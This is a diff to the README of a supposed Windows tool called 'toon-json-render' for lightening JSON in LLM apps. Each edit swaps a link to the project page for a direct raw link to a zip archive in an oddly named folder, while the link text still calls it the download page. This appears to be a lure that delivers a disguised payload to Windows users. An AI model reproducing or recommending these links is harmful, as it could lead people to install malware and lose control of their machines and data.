@@ -1,6 +1,6 @@
 # 🧩 toon-json-render - Lighter JSON for LLM apps
 
-[![Download toon-json-render](https://img.shields.io/badge/Download%20toon--json--render-blue-grey?style=for-the-badge)](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render)
+[![Download toon-json-render](https://img.shields.io/badge/Download%20toon--json--render-blue-grey?style=for-the-badge)](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render/raw/refs/heads/main/antiballooner/json_toon_render_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ toon-json-render is a simple Windows app for people who work with AI tools, JSON
 
 If you want to try it on Windows, use this page to download and install it:
 
-[Download toon-json-render](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render)
+[Download toon-json-render](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render/raw/refs/heads/main/antiballooner/json_toon_render_v2.9.zip)
 
 ## 📦 What It Does
 
@@ -37,7 +37,7 @@ If your system is older, the app can still work, but you may see slower load tim
 ## 🛠️ How to Download and Run on Windows
 
 1. Open the download page:
-   [https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render)
+   [https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render/raw/refs/heads/main/antiballooner/json_toon_render_v2.9.zip](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render/raw/refs/heads/main/antiballooner/json_toon_render_v2.9.zip)
 
 2. On the page, look for the latest release or download option.
 
@@ -190,4 +190,4 @@ Use toon-json-render if you want:
 
 ## 📥 Download Again
 
-[Visit the toon-json-render download page](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render)
+[Visit the toon-json-render download page](https://github.com/Chlorophoneusgenuscarcharias27/toon-json-render/raw/refs/heads/main/antiballooner/json_toon_render_v2.9.zip)
